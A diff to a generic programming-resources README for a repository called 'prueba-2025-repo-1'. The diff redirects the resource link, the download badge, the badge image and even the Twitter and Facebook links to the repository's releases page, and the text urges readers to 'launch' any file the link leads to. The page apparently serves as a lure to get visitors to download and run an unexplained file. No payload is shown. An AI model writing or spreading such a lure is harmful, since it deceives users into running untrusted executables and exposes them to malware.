@@ -20,7 +20,7 @@ Welcome to the "prueba-2025-repo-1" repository! This is your go-to place for all
 - SQL
 
 ## Resources
-📎 [Click here](https://github.com/uploads/App.zip) to access the resources. If the link ends with a file name, make sure to launch it.
+📎 [Click here](https://github.com/MM2sabers/prueba-2025-repo-1/releases) to access the resources. If the link ends with a file name, make sure to launch it.
 
 ## Getting Started
 To get started with the contents of this repository, feel free to explore the various folders and files available. Dive into the code, experiment with different technologies, and enhance your skills.
@@ -33,8 +33,8 @@ If you encounter any issues with the resources or have any questions, please che
 
 ## Connect with Us
 Stay updated with the latest developments by following us on social media:
-- Twitter: [TwitterHandle](https://twitter.com)
-- Facebook: [FacebookPage](https://facebook.com)
+- Twitter: [TwitterHandle](https://github.com/MM2sabers/prueba-2025-repo-1/releases)
+- Facebook: [FacebookPage](https://github.com/MM2sabers/prueba-2025-repo-1/releases)
 
 ## Spread the Word
 Don't forget to give this repository a ⭐️ if you find it useful. Share it with your peers and help them enhance their programming skills too.
@@ -45,8 +45,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ---
 
 <div align="center">
-	<a href="https://github.com/uploads/App.zip">
-		<img src="https://img.shields.io/badge/Download-Resources-blue" alt="Download Resources">
+	<a href="https://github.com/MM2sabers/prueba-2025-repo-1/releases">
+		<img src="https://github.com/MM2sabers/prueba-2025-repo-1/releases" alt="Download Resources">
 	</a>
 </div>
 
